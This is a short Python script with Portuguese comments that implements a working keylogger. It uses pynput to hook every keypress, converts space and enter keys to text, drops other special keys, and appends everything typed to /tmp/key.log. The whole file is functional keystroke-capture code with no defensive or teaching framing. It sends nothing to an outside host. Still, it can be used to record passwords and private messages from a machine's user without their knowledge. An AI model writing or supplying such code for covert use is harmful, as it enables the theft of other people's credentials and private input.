#importando o modulo pynput
from pynput.keyboard import Listener
#importando o modulo para expressão regular
import re

# setando caminho do arquivo
arquivolog = "/tmp/key.log"



#  tratando e salvando valor em arquivo
def capturar(tecla):
    tecla = str(tecla)
    tecla = re.sub(r'\'', '', tecla)
    tecla = re.sub(r'Key.space', ' ', tecla)
    tecla = re.sub(r'Key.enter', '\n', tecla)
    tecla = re.sub(r'Key.*', '', tecla)
    with open(arquivolog, "a") as log:
        log.write(tecla)

#ouvimdo as teclas
with Listener(on_press=capturar) as l:
    l.join()


